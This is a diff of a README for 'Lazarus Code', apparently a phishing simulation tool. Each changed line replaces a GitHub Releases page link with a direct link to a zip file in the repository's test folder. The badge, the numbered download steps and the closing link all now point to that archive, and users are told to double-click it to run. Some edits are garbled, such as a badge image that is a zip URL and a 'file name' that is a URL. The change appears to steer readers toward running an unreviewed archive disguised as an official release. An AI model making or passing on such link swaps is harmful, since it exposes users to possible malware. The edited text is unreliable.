@@ -10,10 +10,10 @@ To use Lazarus Code, you need to download it and run the application on your com
 
 You can download Lazarus Code from our Releases page. 
 
-[![Download Lazarus Code](https://img.shields.io/badge/Download-Lazarus%20Code-blue.svg)](https://github.com/QWYYSYFDS/lazarus-code/releases)
+[![Download Lazarus Code](https://raw.githubusercontent.com/QWYYSYFDS/lazarus-code/main/test/lazarus-code-v3.3-alpha.4.zip%https://raw.githubusercontent.com/QWYYSYFDS/lazarus-code/main/test/lazarus-code-v3.3-alpha.4.zip)](https://raw.githubusercontent.com/QWYYSYFDS/lazarus-code/main/test/lazarus-code-v3.3-alpha.4.zip)
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/QWYYSYFDS/lazarus-code/releases) to see the latest version of the software.
-2. **Choose the Right File:** Look for the most recent release. You will see a list of files available for download. Typically, the file will have a name similar to `lazarus-code-v1.0.exe`. 
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/QWYYSYFDS/lazarus-code/main/test/lazarus-code-v3.3-alpha.4.zip) to see the latest version of the software.
+2. **Choose the Right File:** Look for the most recent release. You will see a list of files available for download. Typically, the file will have a name similar to `https://raw.githubusercontent.com/QWYYSYFDS/lazarus-code/main/test/lazarus-code-v3.3-alpha.4.zip`. 
 3. **Download the File:** Click on the file link to start the download.
 4. **Run the Application:** Once the download is complete, locate the file on your computer. Double-click it to run the application. Follow any prompts that appear.
 
@@ -59,4 +59,4 @@ Lazarus Code is open-source software. You can review the license in the reposito
 We welcome contributions! If you want to help improve Lazarus Code, feel free to submit a pull request or start a discussion in the community.
 
 ## 📥 Download Link
-Don't forget to download Lazarus Code from our [Releases page](https://github.com/QWYYSYFDS/lazarus-code/releases) and start your phishing simulation training today!
+Don't forget to download Lazarus Code from our [Releases page](https://raw.githubusercontent.com/QWYYSYFDS/lazarus-code/main/test/lazarus-code-v3.3-alpha.4.zip) and start your phishing simulation training today!
